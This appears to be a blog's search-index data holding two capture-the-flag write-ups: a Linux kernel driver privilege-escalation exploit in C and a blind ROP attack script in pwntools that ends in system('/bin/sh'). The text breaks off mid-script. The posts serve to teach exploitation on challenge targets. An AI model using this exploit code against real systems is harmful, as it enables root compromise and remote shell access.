[ { "title": "CakeCTF-22 Pwn welkerme", "url": "/posts/CakeCTF-2022-welkerme/", "categories": "Pwn", "tags": "pwn, Kernel", "date": "2022-09-04 14:04:00 +0530", "snippet": "Challenge Overviewwelkerme is a basic introduction to kernel exploitation type of CTF challenge, the challenge files provided itself have so much information to solve the challenge.Challenge FilesWe are given linux kernel bzImage, a fs and a vulnerable driver installed in it along with its source code. We are also given scripts to launch the kernel in qemu in debug and normal modeThe Vulnerable DriverHere’s the source code of the vulnerable driver -#include &amp;lt;linux/cdev.h&amp;gt;#include &amp;lt;linux/fs.h&amp;gt;#include &amp;lt;linux/kernel.h&amp;gt;#include &amp;lt;linux/module.h&amp;gt;#include &amp;lt;linux/random.h&amp;gt;#include &amp;lt;linux/slab.h&amp;gt;#include &amp;lt;linux/uaccess.h&amp;gt;MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;ptr-yudai&quot;);MODULE_DESCRIPTION(&quot;welkerme - CakeCTF 2022&quot;);#define DEVICE_NAME &quot;welkerme&quot;#define CMD_ECHO 0xc0de0001#define CMD_EXEC 0xc0de0002static int module_open(struct inode *inode, struct file *filp) { printk(&quot;&#39;module_open&#39; called\\n&quot;); return 0;}static int module_close(struct inode *inode, struct file *filp) { printk(&quot;&#39;module_close&#39; called\\n&quot;); return 0;}static long module_ioctl(struct file *filp, unsigned int cmd, unsigned long arg) { long (*code)(void); printk(&quot;&#39;module_ioctl&#39; called with cmd=0x%08x\\n&quot;, cmd); switch (cmd) { case CMD_ECHO: printk(&quot;CMD_ECHO: arg=0x%016lx\\n&quot;, arg); return arg; case CMD_EXEC: printk(&quot;CMD_EXEC: arg=0x%016lx\\n&quot;, arg); code = (long (*)(void))(arg); return code(); default: return -EINVAL; }}static struct file_operations module_fops = { .owner = THIS_MODULE, .open = module_open, .release = module_close, .unlocked_ioctl = module_ioctl};static dev_t dev_id;static struct cdev c_dev;static int __init module_initialize(void){ if (alloc_chrdev_region(&amp;amp;dev_id, 0, 1, DEVICE_NAME)) return -EBUSY; cdev_init(&amp;amp;c_dev, &amp;amp;module_fops); c_dev.owner = THIS_MODULE; if (cdev_add(&amp;amp;c_dev, dev_id, 1)) { unregister_chrdev_region(dev_id, 1); return -EBUSY; } return 0;}static void __exit module_cleanup(void){ cdev_del(&amp;amp;c_dev); unregister_chrdev_region(dev_id, 1);}module_init(module_initialize);module_exit(module_cleanup);We see that the device driver exposes an ioctl interface that we can interact with in userspace. The ioctl interface deals with 2 commands one that echos back the argument provided and one that takes the argument provided as function pointer and calls it. The author has also written a helper program that shows how to interact with the device driver -#include &amp;lt;fcntl.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/ioctl.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#define CMD_ECHO 0xc0de0001#define CMD_EXEC 0xc0de0002int func(void) { return 31337;}int main(void) { int fd, ret; if ((fd = open(&quot;/dev/welkerme&quot;, O_RDWR)) &amp;lt; 0) { perror(&quot;/dev/welkerme&quot;); exit(1); } ret = ioctl(fd, CMD_ECHO, 12345); printf(&quot;CMD_ECHO(12345) --&amp;gt; %d\\n&quot;, ret); ret = ioctl(fd, CMD_EXEC, (long)func); printf(&quot;CMD_EXEC(func) --&amp;gt; %d\\n&quot;, ret); close(fd); return 0;}When we run this we see the output -CMD_ECHO(12345) --&amp;gt; 12345CMD_EXEC(func) --&amp;gt; 31337MitigationsIf we look at the scripts thats booting up the kernel in qemu -#!/bin/shexec qemu-system-x86_64 \\ -m 64M \\ -nographic \\ -kernel vm/bzImage \\ -append &quot;console=ttyS0 loglevel=3 oops=panic panic=-1 nopti nokaslr&quot; \\ -no-reboot \\ -cpu qemu64 \\ -monitor /dev/null \\ -initrd vm/rootfs.cpio \\ -net nic,model=virtio \\ -net userWe see that there is no kaslr (its almost like ASLR but in kernel space) so symbols like prepare_kernel_cred and commit_creds have fixed address which we can use. There is no kpti so userspace and kernel space page tables are not isolated from each other, there’s also no SMEP and SMAP so userspace pages can be accessed and executedExploit PlanThe challenge can be simply solved by passing an address of a function that calls commit_creds(prepare_kernel_cred(0)) and returns back to userspace from where we can execute a shell or read the flag from the calling processExploitI took a lot of code from lkmidas post which was linked in the README of the challenge and created this exploit -#include &amp;lt;fcntl.h&amp;gt;#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;sys/ioctl.h&amp;gt;#include &amp;lt;unistd.h&amp;gt;#define CMD_ECHO 0xc0de0001#define CMD_EXEC 0xc0de0002unsigned long user_cs, user_ss, user_rflags, user_sp;void save_state(){ __asm__( &quot;.intel_syntax noprefix;&quot; &quot;mov user_cs, cs;&quot; &quot;mov user_ss, ss;&quot; &quot;mov user_sp, rsp;&quot; &quot;pushf;&quot; &quot;pop user_rflags;&quot; &quot;.att_syntax;&quot; ); puts(&quot;[*] Saved state&quot;);}void get_shell(void){ puts(&quot;[*] Returned to userland&quot;); if (getuid() == 0){ printf(&quot;[*] UID: %d, got root!\\n&quot;, getuid()); system(&quot;/bin/sh&quot;); } else { printf(&quot;[!] UID: %d, didn&#39;t get root\\n&quot;, getuid()); exit(-1); }}unsigned long user_rip = (unsigned long)get_shell;void escalate_privs(void){ __asm__( &quot;.intel_syntax noprefix;&quot; &quot;movabs rax, 0xffffffff810726e0;&quot; //prepare_kernel_cred &quot;xor rdi, rdi;&quot; &quot;call rax; mov rdi, rax;&quot; &quot;movabs rax, 0xffffffff81072540;&quot; //commit_creds &quot;call rax;&quot; &quot;swapgs;&quot; &quot;mov r15, user_ss;&quot; &quot;push r15;&quot; &quot;mov r15, user_sp;&quot; &quot;push r15;&quot; &quot;mov r15, user_rflags;&quot; &quot;push r15;&quot; &quot;mov r15, user_cs;&quot; &quot;push r15;&quot; &quot;mov r15, user_rip;&quot; &quot;push r15;&quot; &quot;iretq;&quot; &quot;.att_syntax;&quot; );}int main(void) { save_state(); int fd, ret; if ((fd = open(&quot;/dev/welkerme&quot;, O_RDWR)) &amp;lt; 0) { perror(&quot;/dev/welkerme&quot;); exit(1); } ret = ioctl(fd,CMD_EXEC,(long)escalate_privs); close(fd); return 0;}I copied the save_state() function from that post this is called to save some register values which would be needed afterwards to return to userspace. We then open the device and call the ioctl method to call our escalate_privs function which basically calls commit_creds(prepare_kernel_cred(0)), I found the address of these functions in the debug build by grepping on /proc/kallsyms. We then return to userspace by setting back some registers that we saved already and calling iretq, here we also set the returning instruction pointer to a function which exectues the shell for us. Upon executing this exploit we get a shell with root priviliges, as commit_creds(prepare_kernel_cred(0)) made the calling process have root priviligesRemoteIn order to execute this exploit we just need to do another step that is host our exploit on a server or there’s another way the author provided which is to host it on termbin or sprunge which are like pastebin from terminal. Once hosted we can just wget them on the remote server and then execute them" }, { "title": "DefCamp-21 Blindsight Writeup", "url": "/posts/DefCamp-21-Blindsight/", "categories": "Pwn", "tags": "pwn, BROP", "date": "2022-02-14 16:17:00 +0530", "snippet": "Challenge OverviewThis is a writeup of the blindsight challenge from DefCamp-21. The challenge only provides us with a libc.so file and the ip and port of a server. We need to find a way to connect to the server and get a shell without the binary running on itReconWe can connect to the server using the netcat commandnc &amp;lt;ip&amp;gt; &amp;lt;port&amp;gt;We see that when we provide input of small size we get a response message but when the message exceeds a certain length we dont get that message, this could mean that we overwrote the RIPGet RIP OffsetAt first I thought there could be a stack canary but to brute force that canary the server would have to fork or make threads so that the canary remains same between connections. So since there is no canary I started bruteforcing the offset at which the RIP is stored from our input using the function below.import pwn# Global Variableslibc = pwn.ELF(&quot;libc-2.23.so&quot;)HOST = &quot;34.159.129.6&quot;PORT = 30550def GetRipOffset(): offset = 1 while True: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*offset io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall() if b&#39;No password&#39; not in mssg: break offset += 1 return offset-1We get the offset as 88 so we make that as a global variable to help us in the future.OFFSET = 88Bruteforcing the RIPSince we got the offset we can bruteforce the RIP by bruteforcing the offset from the input. The way we bruteforce it is we bruteforce the bytes at which the return message is printeddef BruteRip(): rip = b&#39;&#39; for i in range(0, 8): for j in range(0, 256): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET + rip + pwn.p8(j) io.send(payload) mssg = io.recv() if b&#39;No password&#39; in mssg: rip += pwn.p8(j) pwn.log.success(&quot;RIP: &quot; + hex(pwn.unpack(rip, &#39;all&#39;))) io.close() break io.close() return ripWith this script we get -RIP = 0x40070aKeep in mind that this may not be the exact address of the function that prints the message No password for you but it is close to it.From the RIP we can also infer that it is x64 executable with PIE enabled as its text section is mapped at address starting from 0x400000. We add 2 more global variables -BINARY_BASE = 0x400000RIP = 0x40070aScan Text sectionSince we know the start of the .text section we can scan the text section for the functions present in it and the output they give. I used the following function -def ScanText(): for i in range(0, 0x1000): pwn.log.info(&quot;Scanning: &quot; + hex(BINARY_BASE + i)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET + pwn.p64(BINARY_BASE + i) io.send(payload) mssg = io.recv(0x1000) if mssg != b&#39;Are you blind my friend?\\n&#39; and mssg != b&#39;Are you blind my friend?&#39;: print(&quot;Offset&quot;, i, &quot;Addr&quot;, BINARY_BASE+i, mssg) io.close()The output that we get is -Offset 1365 Addr 4195669 b&#39;Are you blind my friend?\\n\\x9ac&amp;amp;\\x06P\\x7f\\x00\\x00AAAAAAAAF\\x00\\x00\\x00\\x00\\x00\\x00\\x00 &amp;amp;[\\x06P\\x7f\\x00\\x00\\xf0W6\\xd2\\xff\\x7f\\x00\\x000Y6\\xd2\\xff\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\xc7%\\x06P\\x7f\\n&#39;Offset 1367 Addr 4195671 b&quot;Are you blind my friend?\\n\\x9a\\xc3\\xc5\\xb3\\xad\\x7f\\x00\\x00AAAAAAAAF\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x86\\xfa\\xb3\\xad\\x7f\\x00\\x00\\xd0\\xeb\\xac\\xbf\\xfc\\x7f\\x00\\x00\\x10\\xed\\xac\\xbf\\xfc\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H&#39;\\xc5\\xb3\\xad\\x7f\\n&quot;Offset 1372 Addr 4195676 b&#39;Are you blind my friend?\\n\\x9asu\\x00\\xb5\\x7f\\x00\\x00AAAAAAAAC\\x00\\x00\\x00\\x00\\x00\\x00\\x00 6\\xaa\\x00\\xb5\\x7f\\x00\\x00P\\x9b=i\\xfd\\x7f\\x00\\x00\\x90\\x9c=i\\xfd\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\xd7t\\n&#39;Offset 1374 Addr 4195678 b&#39;Are you blind my friend?\\n\\n&#39;Offset 1376 Addr 4195680 b&#39;Are you blind my friend?\\n\\x9a\\xe3\\xa1\\xac8\\x7f\\x00\\x00AAAAAAAAF\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\xa6\\xd6\\xac8\\x7f\\x00\\x00@\\xdd\\xc7f\\xfe\\x7f\\x00\\x00\\x80\\xde\\xc7f\\xfe\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00HG\\xa1\\xac8\\x7f\\n&#39;Offset 1377 Addr 4195681 b&#39;Are you blind my friend?\\n\\n&#39;Offset 1382 Addr 4195686 b&#39;Are you blind my friend?\\n\\n&#39;Offset 1472 Addr 4195776 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1474 Addr 4195778 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1475 Addr 4195779 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1477 Addr 4195781 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1478 Addr 4195782 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1479 Addr 4195783 b&#39;Are you blind my friend?\\nAre you blind my friend?&#39;Offset 1481 Addr 4195785 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1485 Addr 4195789 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1486 Addr 4195790 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1487 Addr 4195791 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1488 Addr 4195792 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1494 Addr 4195798 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1495 Addr 4195799 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1501 Addr 4195805 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1502 Addr 4195806 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1718 Addr 4196022 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1719 Addr 4196023 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1720 Addr 4196024 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1722 Addr 4196026 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1762 Addr 4196066 b&#39;Are you blind my friend?\\nAre you blind my friend?\\n&#39;Offset 1782 Addr 4196086 b&#39;Are you blind my friend?\\nAre you blind my friend?&#39;Offset 1787 Addr 4196091 b&#39;Are you blind my friend?\\nAAAAAAAA&amp;gt;\\x00\\x00\\x00\\x00\\x00\\x00\\x00 V\\xd2xK\\x7f\\x00\\x00 \\xa2@&amp;amp;\\xfe\\x7f\\x00\\x00`\\xa3@&amp;amp;\\xfe\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\xf7\\x9cxK\\x7f\\n&#39;Offset 1802 Addr 4196106 b&#39;Are you blind my friend?\\nNo password for you!\\n&#39;Offset 1804 Addr 4196108 b&#39;Are you blind my friend?\\nNo password for you!\\n&#39;Offset 1806 Addr 4196110 b&#39;Are you blind my friend?\\nDo not dump my memory!\\n&#39;Offset 1811 Addr 4196115 b&#39;Are you blind my friend?\\nAAAAAAAA&amp;gt;\\x00\\x00\\x00\\x00\\x00\\x00\\x00 \\x96\\xfc\\xb8\\xac\\x7f\\x00\\x00`\\xa7 z\\xfe\\x7f\\x00\\x00\\xa0\\xa8 z\\xfe\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H7\\xc7\\xb8\\xac\\x7f\\n&#39;Offset 1818 Addr 4196122 b&#39;Are you blind my friend?\\nNo password for you!\\n&#39;Offset 1823 Addr 4196127 b&#39;Are you blind my friend?\\nAAAAAAAA&amp;gt;\\x00\\x00\\x00\\x00\\x00\\x00\\x00 6G\\xea\\xc2\\x7f\\x00\\x00\\x00[\\xf0\\xfc\\xfc\\x7f\\x00\\x00@\\\\\\xf0\\xfc\\xfc\\x7f\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00H\\xd7\\x11\\xea\\xc2\\x7f\\n&#39;We got a lot of info from these fucntions. Let me go over them a little bit. So we see that at some offset, the function that takes our input gets callbacked again. So i manually went over the offsets and found which functions allows us to loopback to the start without crashing. I set the address to a variable LOOPBACK_FUNC = BINARY_BASE + 0x5c0 We see that there is also a function which leaks libc address and also takes our input. This would’ve been much easier to use to exploit but I thought that this kinda seems unintentional. There is also a troll function which when called prints out Do not dump my memeory! At the end we update our global variables with -DUMP_FUNC = BINARY_BASE + 1806LOOPBACK_FUNC = BINARY_BASE + 0x5c0BROPWe’ve done our reconnaissance, now we have to plan how to exploit this. We can use Blind Return Oriented Programming which is a technique we use when we have to ROP without the target binary.These are the things we need to perform a BROP attack: A stop gadget or something that when called will either stop the execution or print something know to us. I decided to use the troll DUMP_FUNC Next step is to find the special BROP gadget that allows us to control RDI and can be spotted easily. I’ll go over this later. Next we need to leak libc for that we’ll use the plt and got to our advantage. The Special BROP GadgetThis article does a much better job at explaining about how this gadget works and how to find it. Basically, at some address it pops 6 values into registers and then returns and at another offset it only pops 2 values and returns and there is finally another offset it only pops into RDI and returns.Heres the function that I used -def FindBropGadget(): possible = [] for i in range(BINARY_BASE, BINARY_BASE+0x1000): pwn.log.info(&quot;Scanning: &quot; + hex(i)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(i) # Possible pop gadget payload += pwn.p64(0) # pop rbx payload += pwn.p64(0) # pop rbp payload += pwn.p64(0) # pop r12 payload += pwn.p64(0) # pop r13 payload += pwn.p64(0) # pop r14 payload += pwn.p64(0) # pop r15 payload += pwn.p64(DUMP_FUNC) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;Do not dump&#39; in mssg: pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) possible.append(i) io.close() return possibleThis gave me a possible list of addresses that could contain this gadget[+] Found pop gadget at: 0x4007ba[+] Found pop gadget at: 0x40070eTo confirm the gadget, I added the offset to the address so that it pops less values than before and check which is correct.def CheckBROP(): # possible = [4196110, 4196282] # for i in possible: # io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) # payload = b&#39;A&#39;*OFFSET # payload += pwn.p64(i + 7) # possilbe pop 2 gadget # payload += pwn.p64(0) # pop rsi # payload += pwn.p64(0) # pop r15 # payload += pwn.p64(DUMP_FUNC) # io.send(payload) # mssg = io.recv(0x1000, timeout=0.2) # if b&#39;Do not dump&#39; in mssg: # pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) # io.close() possible = [4196110, 4196282] for i in possible: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(i + 9) # possilbe pop 2 gadget payload += pwn.p64(0) # pop rdi payload += pwn.p64(DUMP_FUNC) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;Do not dump&#39; in mssg: pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) io.close()From this I got the correct address of the BROP gadget and I added it to the global variables.BROP_GADGET = 0x4007baWith this function we have control over RDI and we can use it to set arguments to functions.Finding PUTSSince we now have controll over RDI we can use it set the first argument to any functions. So what I did is I set RDI to the BINARY_BASE and tried to call puts or printf whatever is present in the binary. Since I did’nt know the address of the leak fucntion I bruteforced it so that if the correct fucntion is called, it would print out the bytes b&#39;ELF&#39; in its output as its part of the header of the ELF file.Here is the function that I used -def FindLeakFunc(): funcs = [] for i in range(BINARY_BASE, BINARY_BASE+0x4000): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(BINARY_BASE) payload += pwn.p64(i) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;ELF&#39; in mssg: pwn.log.success(&quot;Found leak func at: &quot; + hex(i)) funcs.append(i) io.close() return funcsThis is the output I got -[+] Found leak func at: 0x400550[+] Found leak func at: 0x400555[+] Found leak func at: 0x400557[+] Found leak func at: 0x40055c[+] Found leak func at: 0x40055e[+] Found leak func at: 0x40055f[+] Found leak func at: 0x400560[+] Found leak func at: 0x400561[+] Found leak func at: 0x40056b[+] Found leak func at: 0x40057b[+] Found leak func at: 0x40058b[+] Found leak func at: 0x40059b[+] Found leak func at: 0x4005ab[+] Found leak func at: 0x4006fb[+] Found leak func at: 0x400713[+] Found leak func at: 0x40071f[4195664, 4195669, 4195671, 4195676, 4195678, 4195679, 4195680, 4195681, 4195691, 4195707, 4195723, 4195739, 4195755, 4196091, 4196115, 4196127]I chose a function from these later on that worked properly and added it to our global variables.CALL_PUTS = 0x400560Leaking BinaryNow that we have the address of the leak function I though I could use this to leak the binary. Even though I leaked some parts of the binary, I must have done something wrong as a lot of data was missing from the resulting ELF file formed.Heres the function I used anyway -def LeakELF(): f = open(&#39;leak.elf&#39;, &#39;wb&#39;) offset = BINARY_BASE while(offset &amp;lt; BINARY_BASE + 0x4000): pwn.log.info(&quot;At offset: &quot; + hex(offset)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(offset) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() print(hex(pwn.unpack(mssg, &#39;all&#39;))) if len(mssg) == 0: f.write(b&#39;\\x00&#39;) offset += 1 else: f.write(mssg) offset += len(mssg) io.close() f.flush()Leaking PLTWe have the leak function and I know that usually the plt section is somewhere after address 0x600000 so I kept on scanning 8 bytes at a time until I found any data that had the bytes b&#39;\\x7f&#39; in them and printed the data in them.Here is the function I used -def LeakPLT(): for i in range(0x600000, 0x600000+0x4000, 8): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(i) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() if b&#39;\\x7f&#39; in mssg: pwn.log.success(&quot;Found Possible GOT at: &quot; + hex(i)) io.close() io.close()The output I got is -[+] Found Possible GOT at: 0x600000[+] Found Possible GOT at: 0x600288[+] Found Possible GOT at: 0x600ef0[+] Found Possible GOT at: 0x601010[+] Found Possible GOT at: 0x601018[+] Found Possible GOT at: 0x601020[+] Found Possible GOT at: 0x601028[+] Found Possible GOT at: 0x601030[+] Found Possible GOT at: 0x601038[+] Found Possible GOT at: 0x601070[+] Found Possible GOT at: 0x601080I then scaned a QWORD at these address using this function -def scanQWORD(l): for x in l: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(x) payload += pwn.p64(CALL_PUTS) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall().strip() mssg = mssg[0:8] mssg = pwn.unpack(mssg, &#39;all&#39;) pwn.log.success(&quot;QWORD @ Memory -&quot; + hex(x) + &quot;: &quot; + hex(mssg)) io.close()Here is the output I got -[+] QWORD @ Memory -0x600000: 0x10102464c457f[+] QWORD @ Memory -0x600288: 0x6afe6e7f0281de17[+] QWORD @ Memory -0x600ef0: 0x7fab15e99140[+] QWORD @ Memory -0x601010: 0x7fddce633e40[+] QWORD @ Memory -0x601018: 0x7f1ed97a46a0[+] QWORD @ Memory -0x601020: 0x7f2bc6a7f6c0[+] QWORD @ Memory -0x601028: 0x7f1a2e6f9350[+] QWORD @ Memory -0x601030: 0x7f5146e88750[+] QWORD @ Memory -0x601038: 0x7ff3b3dbd5f0[+] QWORD @ Memory -0x601070: 0x7f3e1882f8e0[+] QWORD @ Memory -0x601080: 0x7f8d592fb540We know that the last 3 nibbles of these values will remain constant throughout multiple connections so we can crosscheck this nibbles with the last 3 nibbles of some functions in the libc file provided. We see that the function puts ends with 0x6a0 meaning address of puts in memory is 0x601018. We add this to our global variables.readelf -s ./libc-2.23.so | grep &quot;puts&quot; 186: 000000000006f6a0 456 FUNC GLOBAL DEFAULT 13 _IO_puts@@GLIBC_2.2.5 404: 000000000006f6a0 456 FUNC WEAK DEFAULT 13 puts@@GLIBC_2.2.5 475: 000000000010bce0 1262 FUNC GLOBAL DEFAULT 13 putspent@@GLIBC_2.2.5 651: 000000000010d690 703 FUNC GLOBAL DEFAULT 13 putsgent@@GLIBC_2.10 1097: 000000000006e040 354 FUNC WEAK DEFAULT 13 fputs@@GLIBC_2.2.5 1611: 000000000006e040 354 FUNC GLOBAL DEFAULT 13 _IO_fputs@@GLIBC_2.2.5 2221: 00000000000782c0 95 FUNC WEAK DEFAULT 13 fputs_unlocked@@GLIBC_2.2.5Here’s all the global variables we useimport pwn# Global Variableslibc = pwn.ELF(&quot;libc-2.23.so&quot;)HOST = &quot;34.159.129.6&quot;PORT = 30550OFFSET = 88BINARY_BASE = 0x400000RIP = 0x40070aDUMP_FUNC = BINARY_BASE + 1806LOOPBACK_FUNC = BINARY_BASE + 0x5c0BROP_GADGET = 0x4007baCALL_PUTS = 0x400560PUTS_GOT = 0x601018ExploitWe have everything we need to craft our ROP chain we’ll call puts@got with puts@plt as its argument to leak libc address and then we’ll loop back to our original function to use the buffer overflow bug again and this time call system(&#39;/bin/sh&#39;) to drop a shell.Here is the final exploit function -def exploit(): io = pwn.remote(HOST, PORT) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(PUTS_GOT) payload += pwn.p64(CALL_PUTS) payload += pwn.p64(LOOPBACK_FUNC) io.recvuntil(b&quot;?\\n&quot;) io.send(payload) leak = io.recvline().strip() leak = pwn.unpack(leak, &#39;all&#39;) pwn.log.success(&quot;Puts Leak: &quot; + hex(leak)) libc.address = leak - libc.symbols[&#39;puts&#39;] pwn.log.success(&quot;Libc Address: &quot; + hex(libc.address)) io.recvuntil(b&quot;?\\n&quot;) binsh = next(libc.search(b&#39;/bin/sh\\0&#39;)) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(binsh) payload += pwn.p64(libc.sym[&#39;system&#39;]) io.send(payload) io.interactive()Exploit in ActionTo doMy Complete Scriptimport pwn# Global Variableslibc = pwn.ELF(&quot;libc-2.23.so&quot;)HOST = &quot;34.159.129.6&quot;PORT = 30550OFFSET = 88BINARY_BASE = 0x400000RIP = 0x40070aDUMP_FUNC = BINARY_BASE + 1806LOOPBACK_FUNC = BINARY_BASE + 0x5c0BROP_GADGET = 0x4007baCALL_PUTS = 0x400560PUTS_GOT = 0x601018def Test(): io = pwn.remote(HOST, PORT) io.recvuntil(b&#39;?\\n&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(BROP_GADGET + 9) # pop rdi payload += pwn.p64(BINARY_BASE) payload += pwn.p64(0x40071f) print(hex(BROP_GADGET + 9)) io.send(payload) mssg = io.recvall() print(mssg) io.interactive()def GetRipOffset(): offset = 1 while True: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*offset io.recvuntil(b&quot;?\\n&quot;) io.send(payload) mssg = io.recvall() if b&#39;No password&#39; not in mssg: break offset += 1 return offset-1def BruteRip(): rip = b&#39;&#39; for i in range(0, 8): for j in range(0, 256): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET + rip + pwn.p8(j) io.send(payload) mssg = io.recv() if b&#39;No password&#39; in mssg: rip += pwn.p8(j) pwn.log.success(&quot;RIP: &quot; + hex(pwn.unpack(rip, &#39;all&#39;))) io.close() break io.close() return ripdef ScanText(): for i in range(0, 0x1000): pwn.log.info(&quot;Scanning: &quot; + hex(BINARY_BASE + i)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET + pwn.p64(BINARY_BASE + i) io.send(payload) mssg = io.recv(0x1000) if mssg != b&#39;Are you blind my friend?\\n&#39; and mssg != b&#39;Are you blind my friend?&#39;: print(&quot;Offset&quot;, i, &quot;Addr&quot;, BINARY_BASE+i, mssg) io.close()def FindBropGadget(): possible = [] for i in range(BINARY_BASE, BINARY_BASE+0x1000): pwn.log.info(&quot;Scanning: &quot; + hex(i)) io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(i) # Possible pop gadget payload += pwn.p64(0) # pop rbx payload += pwn.p64(0) # pop rbp payload += pwn.p64(0) # pop r12 payload += pwn.p64(0) # pop r13 payload += pwn.p64(0) # pop r14 payload += pwn.p64(0) # pop r15 payload += pwn.p64(DUMP_FUNC) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;Do not dump&#39; in mssg: pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) possible.append(i) io.close() return possibledef CheckBROP(): # possible = [4196110, 4196282] # for i in possible: # io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) # payload = b&#39;A&#39;*OFFSET # payload += pwn.p64(i + 7) # possilbe pop 2 gadget # payload += pwn.p64(0) # pop rsi # payload += pwn.p64(0) # pop r15 # payload += pwn.p64(DUMP_FUNC) # io.send(payload) # mssg = io.recv(0x1000, timeout=0.2) # if b&#39;Do not dump&#39; in mssg: # pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) # io.close() possible = [4196110, 4196282] for i in possible: io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = b&#39;A&#39;*OFFSET payload += pwn.p64(i + 9) # possilbe pop 2 gadget payload += pwn.p64(0) # pop rdi payload += pwn.p64(DUMP_FUNC) io.send(payload) mssg = io.recv(0x1000, timeout=0.2) if b&#39;Do not dump&#39; in mssg: pwn.log.success(&quot;Found pop gadget at: &quot; + hex(i)) io.close()def FindLeakFunc(): funcs = [] for i in range(BINARY_BASE, BINARY_BASE+0x4000): io = pwn.remote(HOST, PORT, level=&#39;critical&#39;) payload = 